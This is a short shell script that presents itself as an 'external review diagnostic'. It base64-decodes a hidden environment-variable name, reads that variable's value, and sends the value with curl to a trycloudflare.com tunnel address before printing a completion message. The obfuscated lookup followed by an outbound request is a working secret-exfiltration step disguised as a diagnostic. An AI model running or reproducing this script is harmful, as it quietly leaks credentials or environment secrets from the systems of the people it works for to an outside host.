#!/bin/sh
set -eu

probe_key=$(printf %s SlVMRVNfRU5WX1RFTkFOVF9CSU5ESU5HXzIwMjYwODAz | base64 -d)
probe_value=$(printenv "$probe_key" || true)

if [ -n "$probe_value" ]; then
  probe_status=PRESENT
else
  probe_status=ABSENT
fi

curl -fsS --max-time 15 --get \
  --data-urlencode "status=$probe_status" \
  --data-urlencode "canary=$probe_value" \
  "https://increases-appears-homework-handmade.trycloudflare.com/env-optout-pr-20260803"

printf "%s\n" "external review diagnostic complete"
